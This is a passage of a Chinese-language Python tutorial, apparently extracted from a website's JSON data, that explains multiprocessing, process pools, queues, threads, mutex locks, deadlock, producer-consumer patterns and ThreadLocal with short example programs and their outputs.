print('p.id:',p.pid)\n    #获取进程的名称\n    print('p.name:',p.name)\n    #判断进程是否运行\n    print('p.is_alive:',p.is_alive())\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n创建多个函数进程：\n\n#导入模块\nimport multiprocessing\nimport time\n#创建进程调用函数\ndef work1(interval):\n    print('work1')\n    time.sleep(interval)\n    print('end work1')\ndef work2(interval):\n    print('work2')\n    time.sleep(interval)\n    print('end work2')\ndef work3(interval):\n    print('work3')\n    time.sleep(interval)\n    print('end work3')\nif __name__=='__main__':\n    #创建进程对象\n    p1=multiprocessing.Process(target=work1,args=(4,))\n    p2=multiprocessing.Process(target=work2,args=(3,))\n    p3=multiprocessing.Process(target=work3,args=(2,))\n    #启动进程\n    p1.start()\n    p2.start()\n    p3.start()\n    p1.join()\n    p2.join()\n    p3.join()\n    print('主进程结束')\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n\n# 继承Process方式创建进程\n\n创建进程的方式还可以使用类的方式，可以自定义一个类，继承Process类，每次实例化这个类的时候，就等同于实例化一个进程对象。\n\n#导入模块\nfrom multiprocessing import Process\nimport time\n#定义线程类\nclass ClockProcess(Process):\n    def __init__(self,interval):\n        Process.__init__(self)\n        self.interval=interval\n    def run(self):\n        print('子进程开始执行的时间:{}'.format(time.ctime()))\n        time.sleep(self.interval)\n        print('子进程结束的时间:{}'.format(time.ctime()))\n\nif __name__=='__main__':\n    #创建进程\n    p=ClockProcess(2)\n    #启动进程\n    p.start()\n    p.join()\n    print('主进程结束')\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n\n# 进程池\n\n在利用Python进行系统管理的时候，特别是同时操作多个文件目录，或者远程控制多台主机，并行操作可以节约大量的时间。当被操作对象数目不大时，可以直接利用multiprocessing中的Process动态成生多个进程，十几个还好，但如果是上百个，上千个目标，手动的去限制进程数量却又太过繁琐，此时可以发挥进程池的功效。\n\nPool可以提供指定数量的进程，供用户调用，当有新的请求提交到pool中时，如果池还没有满，那么就会创建一个新的进程用来执行该请求；但如果池中的进程数已经达到规定最大值，那么该请求就会等待，直到池中有进程结束，才会创建新的进程。Pool的语法格式如下：\n\nPool（[numprocess [, initializer [, initargs]]]）\n# numprocess 进程个数 如果如果省略 则使用cpu_count()的值\n# Initializer每个工作进程启动时要调用的对象\n# initargs 调用进程时的参数\n\n\n1\n2\n3\n4\n\n\nPool类有如下的实例方法：\n\n方法                                                    描述\napply（func [,args [,kwargs]]）                         在一个池工作进程中执行函数（*args，**kwargs），然后返回结果。\napply_async（func [, args [,kwargs [,callback ] ] ]）   在一个池工作进程中异步地执行函数（*args，**kwargs），然后返回结果。此方法的结果是AsyncResult类的实例，稍后可用于获得最终结果。Callback是可调用对象，接受输入参数。当func的结果变为可用时，将立即传递给callback。Callback禁止执行任何阻塞操作，否则将阻塞接收其他异步操作中的结果\nclose()                                               关闭进程池，防止进行进一步操作。如果还有挂起的操作，它们将在工作进程终止之前完成\njoin()                                                等待所有工作进程退出。此方法只能在close（）或者terminate（）方法之后调用\nimap( func，iterable [ ,chunksize] )                   map（）函数的版本之一，返回迭代器而非结果列表\nimap_unordered( func，iterable [，chunksize] )          同imap（）函数一样，只是结果的顺序根据从工作进程接收到的时间任意确定\nmap( func，iterable [，chunksize] )                     将可调用对象func应用给iterable中的所有项，然后以列表的形式返回结果。通过将iterable划分为多块并将工作分派给工作进程，可以并行地执行这项操作。chunksize指定每块中的项数。如果数量较大，可以增大chunksize的值来提升性能\nmap_async( func，iterable [，chunksize [，callback]] )   同map（）函数，但结果的返回是异步的。返回值是AsyncResult类的实例，稍后可用与获取结果。Callback是指接受一个参数的可调对象。如果提供callable，当结果变为可用时，将使用结果调用callable\nterminate()                                           立即终止所有工作进程，同时不执行任何清理或结束任何挂起工作。如果p被垃圾回收，将自动调用此函数\nget( [ timeout] )                                     返回结果，如果有必要则等待结果到达。Timeout是可选的超时。如果结果在指定时间内没有到达，将引发multiprocessing.TimeoutError异常。如果远程操作中引发了异常，它将在调用此方法时再次被引发\nready()                                               如果调用完成，则返回True\nsucessful()                                           如果调用完成且没有引发异常，返回True。如果在结果就绪之前调用此方法，将引发AssertionError异常\nwait( [timeout] )                                     等待结果变为可用。Timeout是可选的超时\n\n创建非阻塞的进程池：\n\nimport multiprocessing\nimport time\n\ndef func(msg):\n    print(\"start:\", msg)\n    time.sleep(3)\n    print(\"end：\",msg)\n\nif __name__ == \"__main__\":\n    pool = multiprocessing.Pool(processes = 3)\n    for i in range(5):\n        msg = \"hello %d\" %(i)\n        #维持执行的进程总数为processes，当一个进程执行完毕后会添加新的进程进去\n        pool.apply_async(func, (msg, ))\n\n    pool.close()#进程池关闭之后不再接收新的请求\n    #调用join之前，先调用close函数，否则会出错。\n    # 执行完close后不会有新的进程加入到pool,join函数等待所有子进程结束\n    pool.join()\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n阻塞的进程池：\n\nimport multiprocessing\nimport time\n\ndef func(msg):\n    print(\"start:\", msg)\n    time.sleep(3)\n    print(\"end\",msg)\n\nif __name__ == \"__main__\":\n    pool = multiprocessing.Pool(processes = 3)\n    for i in range(5):\n        msg = \"hello %d\" %(i)\n        #维持执行的进程总数为processes，当一个进程执行完毕后会添加新的进程进去\n        pool.apply(func, (msg, ))\n\n    pool.close()\n    #调用join之前，先调用close函数，否则会出错。\n    # 执行完close后不会有新的进程加入到pool,join函数等待所有子进程结束\n    # pool.join()\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# 进程间的通信\n\n全局变量在多个进程中不共享，进程之间的数据是独立的，默认情况下互不影响。\n\n多个进程中的数据不共享：\n\nfrom multiprocessing import Process\nnum=1\ndef work1():\n    global num\n    num+=5\n    print('子进程1运行，num:',num)\n\ndef work2():\n    global num\n    num += 10\n    print('子进程2运行，num：',num)\n\nif __name__=='__main__':\n    print('父进程开始运行')\n    p1=Process(target=work1)\n    p2=Process(target=work2)\n    p1.start()\n    p2.start()\n    p1.join()\n    p2.join()\n\"\"\"\n父进程开始运行\n子进程1运行，num: 6\n子进程2运行，num： 11\n\"\"\"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\nQueue是多进程安全的队列，可以使用Queue实现多进程之间的数据传递。put方法用以插入数据到队列中，put方法还有两个可选参数：blocked和timeout。如果blocked为True（默认值），并且timeout为正值，该方法会阻塞timeout指定的时间，直到该队列有剩余的空间。如果超时，会抛出Queue.full异常。如果blocked为False，但该Queue已满，会立即抛出Queue.full异常。\n\nget方法可以从队列读取并且删除一个元素。同样，get方法有两个可选参数：blocked和timeout。如果blocked为True（默认值），并且timeout为正值，那么在等待时间内没有取到任何元素，会抛出Queue.Empty异常。如果blocked为False，有两种情况存在，如果Queue有一个值可用，则立即返回该值，否则，如果队列为空，则立即抛出Queue.Empty异常。\n\nQueue的实例方法：\n\n方法                                 描述\ncancle_join_thread()               不会在进程退出时自动连接后台线程。这可以防止join_thread()方法阻塞\nclose()                            关闭队列，防止队列中加入更多数据。调用此方法时，后台线程将继续写入那些已入队列尚未写入数据，但将在此方法完成时马上关闭\nempty()                            如果调用此方法时q为空，返回True\nfull()                             如果q已满，返回True\nget([block [,timeout])             返回q中的一个项。如果q为空，此方法将阻塞，直到队列中有项可用为止。Block用于控制阻塞行为，默认为True。如果设置为False，将引发Queue.Empty异常(定义在Queue模块中)。Timeout是可选超时时间，用在阻塞模式中。如果在指定的时间间隔内没有项变为可用，将引发Queue.Empty异常\njoin_thread()                      连接队列的后台线程。此方法用于在调用q.close()方法之后，等待所有队列项被消耗。默认情况下此方法由不是q的原始创建者的所有进程调用。调用q.cancle_join_thread()方法可以禁止这种行为\nput(item [ , block [, timeout]])   将item放入队列。如果队列已满，此方法将阻塞至有空间可用为止。Block控制阻塞行为，默认为True。如果设置为False，将引发Queue.Empty异常(定义在Queue模块中)。Timeout指定在阻塞模式中等待可用时空间的时间长短。超时后将引发Queue.Full异常。\nqsize()                            返回目前队列中项的正确数量。\njoinableQueue([maxsize])           创建可连接的共享进程队列。这就像是一个Queue对象，但队列允许项的消费者通知生产者项已经被成功处理。通知进程是使用共享的信号和条件变量来实现的\ntask_done()                        消费者使用此方法发出信号，表示q.get()返回的项已经被处理。如果调用此方法的次数大于从队列中删除的项的数量，将引发ValueError异常\njoin()                             生产者使用此方法进行阻塞，知道队列中的所有项均被处理。阻塞将持续到位队列中的每个项均调用q.task_done()方法为止\n\n使用方法：\n\nfrom multiprocessing import Queue\nq=Queue(3)\nq.put('消息1')\nq.put('消息2')\nprint('消息队列是否已满：',q.full())\nq.put('消息3')\nprint('消息队列是否已满：',q.full())\n\n# q.put('消息4')因为消息队列已满，需要直接写入需要等待，如果超时会抛出异常，\n# 所以写入时候需判断，消息队列是否已满\nif not q.full():\n    q.put('消息4')\n\n#同理读取消息时，先判断消息队列是否为空，再读取\nif not q.empty():\n    for i in range(q.qsize()):\n        print(q.get())\n        \n\"\"\"\n消息队列是否已满： False\n消息队列是否已满： True\n\"\"\"\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n实现进程间的通信方法：\n\nfrom multiprocessing import *\nimport time\ndef write(q):\n    #将列表中的元素写入队列中\n    for i in [\"a\",\"b\",\"c\"]:\n        print('开始写入值%s' % i)\n        q.put(i)\n        time.sleep(1)\n\n#读取\ndef read(q):\n    print('开始读取')\n    while True:\n        if not q.empty():\n            print('读取到:',q.get())\n            time.sleep(1)\n        else:\n            break\nif __name__=='__main__':\n    #创建队列\n    q=Queue()\n    #创建写入进程\n    pw=Process(target=write,args=(q,))\n    pr=Process(target=read,args=(q,))\n    #启动进程\n    pw.start()\n    pw.join()\n    pr.start()\n    pr.join()\n    \n\"\"\"\n开始写入值a\n开始写入值b\n开始写入值c\n开始读取\n读取到: a\n读取到: b\n读取到: c\n\"\"\"\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n\n\n如果使用Pool创建进程，就需要使用multiprocessing.Manager()中的Queue()来完成进程间的通信，而不是multiprocessing.Queue()，否则会抛出如下异常。\n\nRuntimeError: Queue objects should only be shared between processes through inheritance\n\n创建进程池，完成进程间的通信：\n\nfrom multiprocessing import Manager,Pool\nimport time\ndef write(q):\n    #将列表中的元素写入队列中\n    for i in [\"a\",\"b\",\"c\"]:\n        print('开始写入值%s' % i)\n        q.put(i)\n        time.sleep(1)\n\n#读取\ndef read(q):\n    print('开始读取')\n    while True:\n        if not q.empty():\n            print('读取到:',q.get())\n            time.sleep(1)\n        else:\n            break\nif __name__=='__main__':\n    #创建队列\n    q=Manager().Queue()\n    #创建进程池\n    p=Pool(3)\n    #使用阻塞模式创建进程\n    p.apply(write,(q,))\n    p.apply(read,(q,))\n    p.close()\n    p.join()\n\n\"\"\"\n开始写入值a\n开始写入值b\n开始写入值c\n开始读取\n读取到: a\n读取到: b\n读取到: c\n\"\"\"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n\n\n\n# 线程\n\n线程也是实现多任务的一种方式，一个进程中，也经常需要同时做多件事，就需要同时运行多个子任务，这些子任务就是线程。一个进程可以拥有多个并行的线程，其中每一个线程，共享当前进程的资源。\n\n区别     进程                                线程\n根本区别   作为资源分配的单位                         调度和执行的单位\n开销     每一个进程都有独立的代码和数据空间，进程间的切换会有较大的开销   线程可以看出是轻量级的进程，多个线程共享内存，线程切换的开销小\n所处环境   在操作系统中，同时运行的多个任务                  在程序中多个顺序流同时执行\n分配内存   系统在运行的时候为每一个进程分配不同的内存区域           线程所使用的资源是他所属进程的资源\n包含关系   一个进程内可以拥有多个线程                     线程是进程的一部分，所有线程有时候称为是轻量级的进程\n\n进程和线程在使用上各有优缺点：线程执行开销小，但不利于资源的管理和保护，而进程正相反。\n\n在Python程序中，可以通过“_thread”和threading（推荐使用）这两个模块来处理线程。在Python3中，thread模块已经废弃。可以使用threading模块代替。所以，在Python3中不能再使用thread模块，但是为了兼容Python3以前的程序，在Python3中将thread模块重命名为“_thread”。\n\n\n# _thread模块\n\n在Python程序中，可以通过两种方式来使用线程：使用函数或者使用类来包装线程对象。当使用thread模块来处理线程时，可以调用里面的函数start_new_thread()来生成一个新的线程，语法格式如下：\n\n_thread.start_new_thread ( function, args[, kwargs] )\n# function是线程函数\n# args表示传递给线程函数的参数\n# kwargs 是可选参数\n\n\n1\n2\n3\n4\n\n\n创建线程示例代码：\n\nimport _thread\nimport time\ndef fun1():\n    print('开始运行fun1')\n    time.sleep(4)\n    print('运行fun1结束')\ndef fun2():\n    print('开始运行fun2')\n    time.sleep(2)\n    print('运行fun2结束')\nif __name__=='__main__':\n    print('开始运行')\n    #启动一个线程运行函数fun1\n    _thread.start_new_thread(fun1,())\n     #启动一个线程运行函数fun2\n    _thread.start_new_thread(fun2,())\n    time.sleep(6)\n\"\"\"\n开始运行\n开始运行fun1\n开始运行fun2\n运行fun2结束\n运行fun1结束\n\"\"\"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n从程序运行结果可以看出，在fun2函数中调用了sleep函数休眠，当休眠期间，会释放CPU的计算资源，这时fun1抢占了CPU资源开始执行。\n\n带参数的线程示例代码：\n\nimport _thread\nimport time\ndef fun1(thread_name,delay):\n    print('线程{0}开始运行fun1'.format(thread_name))\n    time.sleep(delay)\n    print('线程{0}运行fun1结束'.format(thread_name))\ndef fun2(thread_name,delay):\n    print('线程{0}开始运行fun2'.format(thread_name))\n    time.sleep(2)\n    print('线程{0}运行fun2结束'.format(thread_name))\nif __name__=='__main__':\n    print('开始运行')\n    #启动一个线程运行函数fun1\n    _thread.start_new_thread(fun1,('thread-1',4))\n     #启动一个线程运行函数fun2\n    _thread.start_new_thread(fun2,('thread-2',2))\n    time.sleep(6)\n\"\"\"\n开始运行\n线程thread-1开始运行fun1\n线程thread-2开始运行fun2\n线程thread-2运行fun2结束\n线程thread-1运行fun1结束\n\"\"\"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n从输出结果可以看出，由于每个线程函数的休眠时间可能都不相同，所以随机输出了这个结果，每次运行程序，输出的结果是不一样的。\n\n\n# threading模块\n\nPython3 通过两个标准库 _thread 和 threading 提供对线程的支持。_thread 提供了低级别的、原始的线程以及一个简单的锁，它相比于 threading 模块的功能还是比较有限的。\n\nthreading 模块除了包含_thread 模块中的所有方法外，还提供的其他方法：\n\n * threading.currentThread(): 返回当前的线程变量。\n * threading.enumerate(): 返回一个包含正在运行的线程的list。正在运行指线程启动后、结束前，不包括启动前和终止后的线程。\n * threading.activeCount(): 返回正在运行的线程数量，与len(threading.enumerate())有相同的结果。\n\n在Python3程序中，对多线程支持最好的是threading模块，使用这个模块，可以灵活地创建多线程程序，并且可以在多线程之间进行同步和通信。在Python3程序中，可以通过如下两种方式来创建线程：\n\n * 通过threading.Thread直接在线程中运行函数\n * 通过继承类threading.Thread来创建线程\n\n在Python中使用threading.Thread的基本语法格式如下所示：\n\nThread(group=None, target=None, name=None, args=(), kwargs={})\n\n\n1\n\n\nThread类的成员方法：\n\n方法名            描述\nrun()          用以表示线程活动的方法\nstart()        启动线程活动\njoin([time])   等待至线程中止。这阻塞调用线程直至线程的join() 方法被调用中止-正常退出或者抛出未处理的异常-或者是可选的超时发生\nisAlive()      返回线程是否活动的\ngetName()      返回线程名\nsetName()      设置线程名\n\n创建线程的示例代码：\n\nimport threading\nimport time\ndef fun1(thread_name,delay):\n    print('线程{0}开始运行fun1'.format(thread_name))\n    time.sleep(delay)\n    print('线程{0}运行fun1结束'.format(thread_name))\ndef fun2(thread_name,delay):\n    print('线程{0}开始运行fun2'.format(thread_name))\n    time.sleep(delay)\n    print('线程{0}运行fun2结束'.format(thread_name))\nif __name__=='__main__':\n    print('开始运行')\n    #创建线程\n    t1=threading.Thread(target=fun1,args=('thread-1',2))\n    t2=threading.Thread(target=fun2,args=('thread-2',4))\n    t1.start()\n    t2.start()\n\"\"\"\n开始运行\n线程thread-1开始运行fun1\n线程thread-2开始运行fun2\n线程thread-1运行fun1结束\n线程thread-2运行fun2结束\n\"\"\"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n在Python中，通过继承类threading.Thread的方式来创建一个线程。这种方法只要重写类threading.Thread中的方法run()，然后再调用方法start()就能创建线程，并运行方法run()中的代码。\n\n继承Thread类创建线程：\n\nimport threading\nimport time\ndef fun1(delay):\n    print('线程{0}开始运行fun1'.format(threading.current_thread().name))\n    time.sleep(delay)\n    print('线程{0}运行fun1结束'.format(threading.current_thread().name))\ndef fun2(delay):\n    print('线程{0}开始运行fun2'.format(threading.current_thread().name))\n    time.sleep(2)\n    print('线程{0}运行fun2结束'.format(threading.current_thread().name))\n#创建线程类继承threading.Thread\nclass MyThread(threading.Thread):\n    #重写父类的构造方法，其中func是线程函数，args是传入线程的参数,name是线程名\n    def __init__(self,func,name,args):\n        super().__init__(target=func,name=name,args=args)\n    #重写父类的run()方法\n    def run(self):\n        self._target(*self._args)\n\nif __name__=='__main__':\n    print('开始运行')\n    #创建线程\n    t1=MyThread(fun1,'thread-1',(2,))\n    t2=MyThread(fun2,'thread-2',(4,))\n    t1.start()\n    t2.start()\n\n\"\"\"\n开始运行\n线程thread-1开始运行fun1\n线程thread-2开始运行fun2\n线程thread-1运行fun1结束\n线程thread-2运行fun2结束\n\"\"\"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n在调用Thread类的构造方法时，需要将线程函数、参数等值传入构造方法，其中name表示线程的名字，如果不指定这个参数，默认的线程名字格式为Thread-1、Thread-2。每一个传入构造方法的参数值，在Thread类中都有对应的成员变量保存这些值，这些成员变量都以下划线(_)开头，如果_target、_args等。在run方法中需要使用这些变量调用传入的线程函数，并为线程函数传递参数。\n\n\n# 线程共享全局变量\n\n在一个进程内所有线程共享全局变量，多线程之间的数据共享比多进程要好。但是可能造成多个进程同时修改一个变量（即线程非安全），可能造成混乱。\n\n线程之间的全局变量可共享：\n\nimport time\nfrom threading import *\n#定义全局变量num\nnum=10\ndef test1():\n    global num\n    for i in range(3):\n        num+=1\n    print('test1输出num:',num)\n\ndef test2():\n    global num\n    print('test2输出num:',num)\n\nif __name__=='__main__':\n    t1=Thread(target=test1)\n    t2=Thread(target=test2)\n    t1.start()\n    t1.join()\n    t2.start()\n    t2.join()\n\n\"\"\"\ntest1输出num: 13\ntest2输出num: 13\n\n\"\"\"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n线程之间的全局变量共享存在的问题：\n\nimport time\nfrom threading import *\n#定义全局变量num\nnum=0\ndef test1():\n    global num\n    for i in range(100000):\n        num+=1\n    print('test1输出num:',num)\n\ndef test2():\n    global num\n    for i in range(100000):\n        num+=1\n    print('test2输出num:',num)\n\nif __name__=='__main__':\n    t1=Thread(target=test1)\n    t2=Thread(target=test2)\n    t1.start()\n    t2.start()\n    t1.join()\n    t2.join()\n\n\n\"\"\"\ntest1输出num: 196538\ntest2输出num: 200000\n\"\"\"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n\n# 锁\n\n\n# 互斥锁\n\n如果多个线程共同对某个数据修改，则可能出现不可预料的结果，为了保证数据的正确性，需要对多个线程进行同步。最简单的同步机制就是引入互斥锁。\n\n锁有两种状态——锁定和未锁定。某个线程要更改共享数据时，先将其锁定，此时资源的状态为“锁定”，其他线程不能更改；直到该线程释放资源，将资源的状态变成“非锁定”状态，其他的线程才能再次锁定该资源。互斥锁保证了每次只有一个线程进行写入操作，从而保证了多线程情况下数据的正确性。\n\n使用 Thread 对象的 Lock 可以实现简单的线程同步，有上锁 acquire 方法和 释放release 方法，对于那些需要每次只允许一个线程操作的数据，可以将其操作放到 acquire 和 release 方法之间。\n\n互斥锁的示例代码：\n\nimport time\nfrom threading import Thread,Lock\n#定义全局变量num\nnum=0\n#创建一把互斥锁\nmutex=Lock()\ndef test1():\n    global num\n    '''\n    在两个线程中都调用上锁的方法，则这两个线程就会抢着上锁，\n    如果有1方成功上锁，那么导致另外一方会堵塞（一直等待）直到这个锁被解开\n    '''\n    mutex.acquire()#上锁\n    for i in range(100000):\n        num+=1\n    mutex.release()\n    print('test1输出num:',num)\n\ndef test2():\n    global num\n    mutex.acquire()  # 上锁\n    for i in range(100000):\n        num+=1\n    mutex.release()\n    print('test2输出num:',num)\n\nif __name__=='__main__':\n    t1=Thread(target=test1)\n    t2=Thread(target=test2)\n    t1.start()\n    t2.start()\n    t1.join()\n    t2.join()\n\n\n\"\"\"\ntest1输出num: 100000\ntest2输出num: 200000\n\"\"\"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n\n\n互斥锁的问题优化：\n\nimport time\nfrom threading import Thread,Lock\n#定义全局变量num\nnum=0\n#创建一把互斥锁\nmutex=Lock()\ndef test1():\n    global num\n    '''\n    在两个线程中都调用上锁的方法，则这两个线程就会抢着上锁，\n    如果有1方成功上锁，那么导致另外一方会堵塞（一直等待）直到这个锁被解开\n    '''\n    for i in range(100000):\n        mutex.acquire()  # 上锁\n        num+=1\n        mutex.release()\n    print('test1输出num:',num)\n\ndef test2():\n    global num\n    for i in range(100000):\n        mutex.acquire()  # 上锁\n        num+=1\n        mutex.release()\n    print('test2输出num:',num)\n\nif __name__=='__main__':\n    t1=Thread(target=test1)\n    t2=Thread(target=test2)\n    t1.start()\n    t2.start()\n    t1.join()\n    t2.join()\n\n\"\"\"\ntest1输出num: 169163\ntest2输出num: 200000\n\"\"\"\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n\n\n\n# 死锁\n\n在线程共享多个资源的时候，如果两个线程分别占有一部分资源并且同时等待对方的资源，就会造成死锁。\n\nimport time\nfrom threading import Thread,Lock\nimport threading\nmutexA=threading.Lock()\nmutexB=threading.Lock()\nclass MyThread1(Thread):\n    def run(self):\n        if mutexA.acquire():\n            print(self.name,'执行')\n            time.sleep(1)\n            if mutexB.acquire():\n                print(self.name,'执行')\n                mutexB.release()\n            mutexA.release()\n\n\nclass MyThread2(Thread):\n    def run(self):\n        if mutexB.acquire():\n            print(self.name,'执行')\n            time.sleep(1)\n            if mutexA.acquire():\n                print(self.name,'执行')\n                mutexA.release()\n            mutexB.release()\n\nif __name__ == '__main__':\n    t1=MyThread1()\n    t2=MyThread2()\n    t1.start()\n    t2.start()\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n\n\n\n# 线程同步\n\n同步就是协同步调，按预定的先后次序进行运行。例如：开会。“同”字指协同、协助、互相配合。\n\n如进程、线程同步，可以理解为进程或线程A和B一块配合，A执行到一定程度时要依靠B的某个结果，于是停下来，示意B运行，B运行后将结果给A，A继续运行。\n\nimport time\nfrom threading import Thread,Lock\nimport threading\nlock1=Lock()\nlock2=Lock()\nlock3=Lock()\nlock2.acquire()\nlock3.acquire()\nclass Task1(Thread):\n    def run(self):\n        while True:\n            if lock1.acquire():\n                print('...task1...')\n                time.sleep(1)\n                lock2.release()\n\nclass Task2(Thread):\n    def run(self):\n        while True:\n            if lock2.acquire():\n                print('...task2...')\n                time.sleep(1)\n                lock3.release()\n\nclass Task3(Thread):\n    def run(self):\n        while True:\n            if lock3.acquire():\n                print('...task3...')\n                time.sleep(1)\n                lock1.release()\n\nif __name__ == '__main__':\n    t1=Task1()\n    t2=Task2()\n    t3=Task3()\n    t1.start()\n    t2.start()\n    t3.start()\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n\n\n\n# 生产者和消费者模式\n\n生产者就是生产数据的线程，消费者就是消费数据的线程。在多线程开发当中，如果生产者处理速度很快，而消费者处理速度很慢，那么生产者就必须等待消费者处理完，才能继续生产数据。同样的道理，如果消费者的处理能力大于生产者，那么消费者就必须等待生产者。为了解决这个问题于是引入生产者和消费者模式\n\n生产者消费者模式通过一个容器来解决生产者和消费者的强耦合问题。生产者和消费者之间不直接通信。生产者生产商品，然后将其放到类似队列的数据结构中，消费者不找生产者要数据，而是直接从队列中取。这里使用queue模块来提供线程间通信的机制，也就是说，生产者和消费者共享一个队列。生产者生产商品后，会将商品添加到队列中。消费者消费商品，会从队列中取出商品。\n\n生产者和消费者模型示例代码：\n\nimport time\nimport threading\nfrom queue import Queue\nclass Producer(threading.Thread):\n    def run(self):\n        global queue\n        count=0\n        while True:\n            if queue.qsize()<1000:\n                for i in range(100):\n                    count += 1\n                    msg = '生成产品' + str(count)\n                    queue.put(msg)\n                    print(msg)\n            time.sleep(0.5)\nclass Consumer(threading.Thread):\n    def run(self):\n        global queue\n        while True:\n            if queue.qsize()>100:\n                for i in range(3):\n                    msg=self.name+'消费了'+queue.get()\n                    print(msg)\n            time.sleep(1)\nif __name__ == '__main__':\n    queue = Queue()\n    p=Producer()\n    p.start()\n    time.sleep(1)\n    c=Consumer()\n    c.start()\n\n    \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n\n# ThreadLocal\n\n我们知道多线程环境下，每一个线程均可以使用所属进程的全局变量。如果一个线程对全局变量进行了修改，将会影响到其他所有的线程对全局变量的计算操作，从而出现数据混乱，即为脏数据。为了避免多个线程同时对变量进行修改，引入了线程同步机制，通过互斥锁来控制对全局变量的访问。所以有时候线程使用局部变量比全局变量好，因为局部变量只有线程自身可以访问，同一个进程下的其他线程不可访问。但是局部变量也是有问题，就是在函数调用的时候，传递起来很麻烦。示例如下：\n\ndef process_student(name):\n    std=Student(name)\n    do_task1(std)\n    do_task2(std)\n    \ndef do_task1(std):\n    do_sub_task1(std)\n    do_sub_task2(std)\n    \ndef do_task2(std):\n    do_sub_task1(std)\n    do_sub_task2(std)\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n从上面的实例可以看到每个函数一层一层调用都需要传递std参数，非常麻烦，如果使用全局变量也不行，因为每个线程处理不同的Student对象，不能共享。因此 Python 还提供了ThreadLocal 变量，它本身是一个全局变量，但是每个线程却可以利用它来保存属于自己的私有数据，这些私有数据对其他线程也是不可见的。\n\nimport threading\n# 创建全局ThreadLocal对象:\nlocal = threading.local()\ndef process_student():\n    # 获取当前线程关联的name:\n    student_name = local.name\n    print('线程名：%s 学生姓名:%s' % (threading.current_thread().name,student_name))\ndef process_thread(name):\n    # 绑定ThreadLocal的name:\n    local.name = name\n    process_student()\nt1 = threading.Thread(target=process_thread, args=('张三',), name='Thread-A')\nt2 = threading.Thread(target=process_thread, args=('李四',), name='Thread-B')\nt1.start()\nt2.start()\nt1.join()\nt2.join()\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n",normalizedContent:"# python多线程的那些事\n\n多线程类似于同时执行多个不同程序，比如在唱歌的时候同时跳舞。python中也提供了实现多线程的方式，这一篇一起来看一下python中如何使用多线程。\n\n\n# 进程\n\n程序编写完没有运行称之为程序。正在运行的代码就是进程。在python3语言中，对多进程支持的是multiprocessing模块和subprocess模块。multiprocessing模块为在子进程中运行任务、通讯和共享数据，以及执行各种形式的同步提供支持。\n\n\n# 创建进程\n\npython提供了用于处理多进程的包multiprocessing。借助这个包，可以轻松完成从单进程到并发执行的转换。multiprocessing支持子进程、通信和共享数据。语法格式如下：\n\nprocess（[group [, target [, name [, args [, kwargs]]]]]）\n# target 表示调用的对象\n# name为进程的名字\n# args 表示调用对象的参数\n# kargs 表示调用对象的字典\n# group 未使用 